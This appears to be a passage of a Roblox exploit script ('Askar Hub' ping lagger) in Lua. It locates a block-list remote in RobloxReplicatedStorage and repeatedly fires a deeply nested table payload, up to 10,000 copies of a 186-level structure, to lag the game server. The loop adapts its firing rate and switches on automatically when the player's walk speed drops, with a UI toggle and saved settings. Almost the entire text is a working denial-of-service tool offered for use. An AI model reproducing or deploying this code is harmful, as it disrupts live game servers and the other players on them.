local CONFIG_FILE = "ANASPingLagger_Config.json"

local DEFAULT_CFG = { power = 95000, interval = 0.125, keybind = "F", controllerBind = "None", autoBrainrot = true, background = BG_IMAGE }
local cfg = table.clone(DEFAULT_CFG)

local function saveConfig()
	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
	if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
end

local function loadConfig()
	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
	if ok and type(data) == "table" then
		cfg.power = tonumber(data.power) or DEFAULT_CFG.power
		cfg.interval = tonumber(data.interval) or DEFAULT_CFG.interval
		cfg.keybind = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
		cfg.controllerBind = type(data.controllerBind) == "string" and data.controllerBind or DEFAULT_CFG.controllerBind
		cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
		cfg.background = BG_IMAGE
	end
end
loadConfig()

-- Askar Hub Remote Finder (supports RemoteEvent, UnreliableRemoteEvent, RemoteFunction)
local function findRemote()
	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
	if not rrs then return nil end
	local found = nil
	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
		local r = rrs:FindFirstChild(name)
		if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
			found = r
			break
		end
	end
	if not found then
		for _, c in ipairs(rrs:GetChildren()) do
			if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
				found = c
				break
			end
		end
	end
	return found
end

remote = findRemote()

-- Askar Hub Payload Builder
local function buildPayload(power)
	local safePower = tonumber(power) or DEFAULT_CFG.power
	if safePower < 1 then safePower = 1 end
	local main = {}
	local nested = {{}}
	local current = nested[1]
	for _ = 1, 186 do
		local n = {}
		table.insert(current, n)
		current = n
	end
	local maxRep = math.min(math.floor(safePower / 188), 10000)
	if maxRep < 1 then maxRep = 1 end
	for _ = 1, maxRep do
		table.insert(main, nested)
	end
	return main
end

local function setLag(state)
	active = state
	if loopTask then pcall(task.cancel, loopTask) loopTask = nil end
	if active then
		if not remote or not remote.Parent then remote = findRemote() end
		local payload = buildPayload(cfg.power)
		loopTask = task.spawn(function()
			local currentDelay = tonumber(cfg.interval) or DEFAULT_CFG.interval
			while active do
				if not remote or not remote.Parent then
					remote = findRemote()
					if not remote then task.wait(0.5) continue end
				end
				local ok = pcall(function()
					if remote:IsA("RemoteFunction") then
						remote:InvokeServer(payload)
					else
						remote:FireServer(payload)
					end
				end)
				currentDelay = ok and math.max(currentDelay * 0.995, 0.05) or math.min(currentDelay * 1.5, 0.5)
				task.wait(currentDelay)
			end
		end)
	end
end

RunService.Heartbeat:Connect(function()
	if not cfg.autoBrainrot then
		if brainrotMode then brainrotMode, lastBrainrotState = false, false end
		return
	end
	local char = plr.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if not hum then return end

	local hasBrainrot = hum.WalkSpeed < 25
	if hasBrainrot and not lastBrainrotState then
		brainrotMode, lastBrainrotState, manualOverride = true, true, false
		if not active then setLag(true) if refreshUI then refreshUI() end end
	elseif not hasBrainrot and lastBrainrotState then
		brainrotMode, lastBrainrotState, manualOverride = false, false, false
		if active then setLag(false) if refreshUI then refreshUI() end end
	end
end)

local dragging, dragStart, startAbsPos
frame.InputBegan:Connect(function(input)
	if uiLocked then return end
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging, dragStart, startAbsPos = true, input.Position, frame.AbsolutePosition
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local delta = input.Position - dragStart
		local vp = workspace.CurrentCamera.ViewportSize
		local newX = math.clamp(startAbsPos.X + delta.X, 0, vp.X - frame.AbsoluteSize.X)
		local newY = math.clamp(startAbsPos.Y + delta.Y, 0, vp.Y - frame.AbsoluteSize.Y)
		frame.Position = UDim2.new(0, newX, 0, newY)
	end
end)
UserInputService.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
end)

refreshUI = function()
	updatePresetButtonsVisual()
	lockBtn.Text, lockBtn.TextColor3 = uiLocked and "🔒" or "🔓", uiLocked and Color3.fromRGB(255, 198, 42) or THEME_WHITE
	lagBtn.Text, topStatusBtn.Text = active and "ACTIVE" or "OFF", active and "ACTIVE" or "OFF"
end

local function toggleLagState()
	active = not active
	manualOverride = not active
	setLag(active)
	refreshUI()
end

lagBtn.MouseButton1Click:Connect(toggleLagState)
topStatusBtn.MouseButton1Click:Connect(toggleLagState)

lockBtn.MouseButton1Click:Connect(function() uiLocked = not uiLocked refreshUI() end)

refreshUI()
if active then setLag(true) end
